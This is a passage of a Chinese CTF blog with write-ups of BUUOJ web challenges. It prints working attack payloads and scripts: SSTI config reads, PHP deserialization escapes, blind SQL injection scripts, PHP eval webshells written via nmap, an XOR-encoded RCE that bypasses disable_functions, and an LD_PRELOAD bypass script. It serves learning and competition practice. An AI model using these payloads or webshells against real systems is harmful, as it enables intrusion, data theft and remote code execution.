&#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com) CISCN 2019 初赛]Love Math_羽的博客-CSDN博客 CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客 [WUSTCTF2020]朴实无华 payload： ？num=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine import flask import os app &#x3D; flask.Flask(__name__) app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。 @app.route(&#39;&#x2F;&#39;) def index(): return open(__file__).read() @app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;) def shrine(shrine): def safe_jinja(s): s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单 return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空 return flask.render_template_string(safe_jinja(shrine)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(debug&#x3D;True) ssti注入，先试一个49 接下来就可以考虑在shrine下直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果 current_app意思应该是当前app，那我们就当前app下的config： 于是可以读到flag &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; 也可以用 get_flashed_messages 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。 get_flashed_messages.__globals__[&#39;current_app&#39;].config [0CTF 2016]piapiapia进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到www.zip备份文件 访问一下register.php注册个账户就可以登录了 再看其他的内容 profile.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; $username &#x3D; $_SESSION[&#39;username&#39;]; $profile&#x3D;$user-&gt;show_profile($username); if($profile &#x3D;&#x3D; null) &#123; header(&#39;Location: update.php&#39;); &#125; else &#123; $profile &#x3D; unserialize($profile); $phone &#x3D; $profile[&#39;phone&#39;]; $email &#x3D; $profile[&#39;email&#39;]; $nickname &#x3D; $profile[&#39;nickname&#39;]; $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;])); ?&gt; class.php &lt;?php require(&#39;config.php&#39;); class user extends mysql&#123; private $table &#x3D; &#39;users&#39;; public function is_exists($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;); $value_list &#x3D; Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username &#x3D; parent::filter($username); $new_profile &#x3D; parent::filter($new_profile); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125; &#125; class mysql &#123; private $link &#x3D; null; public function connect($config) &#123; $this-&gt;link &#x3D; mysql_connect( $config[&#39;hostname&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;] ); mysql_select_db($config[&#39;database&#39;]); mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123; $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;; $result &#x3D; mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key &#x3D; implode(&#39;,&#39;, $key_list); $value &#x3D; &#39;\\&#39;&#39; . implode(&#39;\\&#39;,\\&#39;&#39;, $value_list) . &#39;\\&#39;&#39;; $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape &#x3D; array(&#39;\\&#39;&#39;, &#39;\\\\\\\\&#39;); $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;; $string &#x3D; preg_replace($escape, &#39;_&#39;, $string); $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; public function __tostring() &#123; return __class__; &#125; &#125; session_start(); $user &#x3D; new user(); $user-&gt;connect($config); update.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123; $username &#x3D; $_SESSION[&#39;username&#39;]; if(!preg_match(&#39;&#x2F;^\\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;])) die(&#39;Invalid phone&#39;); if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;])) die(&#39;Invalid email&#39;); if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10) die(&#39;Invalid nickname&#39;); $file &#x3D; $_FILES[&#39;photo&#39;]; if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000) die(&#39;Photo size error&#39;); move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;])); $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;]; $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;]; $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;]; $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]); $user-&gt;update_profile($username, serialize($profile)); echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;; &#125; else &#123; ?&gt; config.php &lt;?php $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;; $config[&#39;username&#39;] &#x3D; &#39;root&#39;; $config[&#39;password&#39;] &#x3D; &#39;&#39;; $config[&#39;database&#39;] &#x3D; &#39;&#39;; $flag &#x3D; &#39;&#39;; ?&gt; profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile); 所以再根据 $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; 可以进行反序列化字符逃逸 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 这里这个过滤可以利用抓包将nickename改成数组类型来绕过 看一下这个your profile页面 看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag [MRCTF2020]PYWebsite进去后看源码，有一段js脚本 试了一下这个md5，能解出来但是是付费记录 所以直接看flag.php “除了购买者和我自己” 那就试试127.0.0.1本地访问 [极客大挑战 2019]FinalSQL盲注，注入点在id 可以利用异或来进行盲注 找个脚本直接爆破，学一下这个脚本 import requests import sys import time def get_DBlen(url): for i in range(1,10): db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: print(&quot;数据库名称的长度为:%d&quot;%i) return i def get_DBname(url,length): DBname &#x3D; &quot;&quot; length &#x3D; length + 1 for i in range(1,length): Max &#x3D; 122 Min &#x3D; 41 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max &#x3D; Mid-1 Mid &#x3D; (Min+Max)&#x2F;&#x2F;2 pass pass DBname &#x3D; DBname + chr(Mid) print(DBname) return DBname def get_TBname(url): name&#x3D;&quot;&quot; i &#x3D; 0 while True: i &#x3D; i+1 Max &#x3D; 128 Min &#x3D; 32 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 爆字段名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 获取flag db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max&#x3D;Mid-1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass pass name&#x3D;name+chr(Mid) print(name) if Mid &#x3D;&#x3D; 31: break time.sleep(0.5) if __name__&#x3D;&#x3D;&quot;__main__&quot;: url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot; db_Len &#x3D; get_DBlen(url) db_Name &#x3D; get_DBname(url,db_Len) tb_name &#x3D; get_TBname(url) [NPUCTF2020]ReadlezPHP 跳到time.php?source界面看看内容 反序列化构造实现命令执行 system这里应该是过滤了，可以用assert代替 assert()简介：判断一个表达式是否成立。返回true or false。 当参数为字符串时，会被当作php代码执行。 例如 assert(&quot;phpinfo()&quot;) &lt;&#x3D;&#x3D;&gt; &lt;?phpinfo()?&gt; assert与eval的区别 assert把整个字符串参数当php代码执行，eval把合法的php代码执行。 payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;} 或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo 搜索flag就能找到 [CISCN2019 华东南赛区]Web11xff头的ssti注入，我好像之前做过一个差不多的 界面右上角ip可随意改变，因此可以利用readfile函数读flag [BJDCTF2020]EasySearch扫目录，发现index.php.swp界面 要让password前六位md5值为6d0bc1 爆破一下 登录后抓包 这里可以看见一个shtml页面 进入后的页面 这里admin的位置是我们的用户名，这里利用了ssl注入 SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入 模板就类似于 可以先用ls查看目录找到flag文件，再利用cat查看 访问页面找到flag [BSidesCF 2019]Futurellaf12源码里有flag 好久没做这么简单的了 [网鼎杯 2020 朱雀组]Nmap常见的nmap命令 nmap linux 命令 在线中文手册 (51yip.com) 选项 解释-oN 标准保存-oX XML保存-oG Grep保存-oA 保存到所有格式-append-output 补充保存文件选项-oG将结果Grep保存。 nmap -F -oG test.txt 192.168.23.11选项-oA该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。 nmap -F -oA test 192.168.3.2 这里就是要用nmap的 -oN命令写shell &#39; -oN w4ke.txt &#39; 返回host maybe down之后访问w4ke.txt 所以可以试试写个一句话木马上去 &#39; -oN b.txt &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39; 返回了hacker，所以应该是有东西被过滤了 试了一下发现是php被过滤了 可以用其他的进行替代 &lt;?&#x3D;eval($_POST[a]);?&gt; 利用post传参执行命令 参考链接 网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客 网鼎杯 2020 朱雀组]Nmap (icode9.com) [强网杯 2019]高明的黑客根据题目提示下载压缩包文件，里面存在三千多个php文件 每一个文件里都有shell，我们要找到一个能用的 import requests import os import re url &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39; path &#x3D; r&#39;C:\\Users\\ethe\\Desktop\\www\\src&#39; ptn_get &#x3D; re.compile(br&quot;\\$_GET\\[&#39;(\\w+)&#39;\\]&quot;) ptn_res &#x3D; re.compile(br&#39;success_hack&#39;) count &#x3D; 0 for f in list(os.scandir(path)): print(str(f)[11:-2]) count +&#x3D; 1 with open(f.path, &#39;rb&#39;) as fp: data &#x3D; fp.read() for get in set(ptn_get.findall(data)): get &#x3D; get.decode(&#39;utf-8&#39;) cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39; r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;) if ptn_res.search(r.content) is not None: print(f.name, get) exit() [NCTF2019]True XML cookbook题目提示xml，抓包后 猜应该是有xxe注入，直接上payload，发现没读取成功 看一看dologin.php的源码 &lt;?php &#x2F;** * autor: c0ny1 * date: 2018-2-7 *&#x2F; $USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å· $PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç  $result &#x3D; null; libxml_disable_entity_loader(false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); try&#123; $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); $username &#x3D; $creds-&gt;username; $password &#x3D; $creds-&gt;password; if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username); &#125;else&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage()); &#125; header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;); echo $result; ?&gt; 但是从这个源码里也找不到flag 后边就是我看不懂的操作了 访问proc/net/arp文件查看有无可利用内网主机 尝试访问一下这个ip，报错 之后c段扫描，找到flag [CISCN2019 华北赛区 Day1 Web2]ikun这题感觉有点问题 写脚本找lv6 找到后 很明显钱不够 这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向 接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin 但是直接在url栏修改会要求用户是admin 这就要求修改jwt的cookie 认识JWT - 废物大师兄 - 博客园 (cnblogs.com) 这里的c-jwt-crack工具不会用，所以就跳过这部分吧 看登录后的源码看见www.zip路径 下载压缩包后发现全为python文件 这里是利用了python反编译 pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。 p = pickle.loads(urllib.unquote(become)) urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为： （1）pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （2）pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。 （3）pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （4）pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法： 全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法 1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。 这里采用reduce 当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填 百度个脚本 把这个值给become里放包就行 参考链接 Python魔法方法指南_宇宙浪子的专栏-CSDN博客 Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com) 几天之后的补，jwt那个工具环境弄好了 [MRCTF2020]套娃才发现这就是寒假那个招新赛的原题 下划线可以用.来绕过，第二个if可以利用%0a换行绕过 要求本地登录 抓包改xff 里面有一段js代码 post一个merak值，得到一段代码 代码审计 要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day 可以用data://text/plain,绕过 也可以用data://text/plain;base64, 然后存在一个file_get_contents读取传入的file 要让这个值经过change函数后为flag.php 传进去，拿flag [极客大挑战 2019]RCE ME&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code); &#125; else&#123; highlight_file(__FILE__); &#125; &#x2F;&#x2F; ?&gt; 有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过 取反 成功执行 这里可以看到禁用的函数 或者利用异或 code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 一样可以进入phpinfo页面 查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马 //抄的payload ?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); &#x2F;&#x2F;别忘了后面的分号 或者： ?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) 然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag 但是 disable_functions禁用的函数太多导致shell不能执行命令 这里可以用蚁剑的插件（蚁剑yyds 还有一种方法 利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE参考链接：https://www.anquanke.com/post/id/175403 无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户 EXP地址 我看不懂，但我大受震撼 上传bypass.php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;; $cmd &#x3D; $_GET[&quot;cmd&quot;]; $out_path &#x3D; $_GET[&quot;outpath&quot;]; $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;; putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量 $so_path &#x3D; $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path); &#x2F;&#x2F;加载恶意动态库 mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。 echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;; unlink($out_path); ?&gt; 最终payload http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so 参考链接 bypass_disable_functions | 0xCreed (jxustctf.top) [BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com) 极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客 极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过 [BSidesCF 2019]Kookie 不知道密码，sql注入也不成功 直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。 [WUSTCTF2020]颜值成绩查询布尔盲注，过滤了空格 (ascii(substr(database(),{},1))={})&quot;.format(i,j) (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={}) (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={}) (ascii(substr((select(group_concat(value))from(flag)) 脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot; data &#x3D; &#39;&#39; k &#x3D; 0 for i in range(13,50): k &#x3D; 0 for j in range(43,127): gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j) res &#x3D; requests.get(url+gets) if &quot;your score is: 100&quot; in res.text: data +&#x3D; chr(j) print(data) k &#x3D; 1 break if(k &#x3D;&#x3D; 0): print(&quot;err!&quot;) exit() 因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了 一定是buu flag太长了（ 算是第一次自己写脚本了 遍历属实跑的太慢了，抽空学一下二分法的写法 flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4} [GWCTF 2019]枯燥的抽奖 涉及了php的伪随机 如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的 查看源码找到check.php pbEzqyRCJP &lt;?php #这不是抽奖程序的源代码！不许看！ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123; if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;; &#125; &#125; show_source(&quot;check.php&quot;); 知道前几位了 根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的 str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; str2&#x3D;&#39;ENxxxZwNwR&#39; str3 &#x3D; str1[::-1] length &#x3D; len(str2) res&#x3D;&#39;&#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] &#x3D;&#x3D; str1[j]: res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39; break print(res) 放到php_mt_seed里跑种子 再利用这个脚本得到最后的值 &lt;?php mt_srand(499600072); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; echo $str; ?&gt; 吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱 官网下的爆不出seed，从这里下的可以Index of /pub/projects/php_mt_seed (openwall.net) 还有就是一样的种子在php版本不一样的时候出来的值也不一样 [Zer0pts2020]Can you guess it?&lt;?php include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); 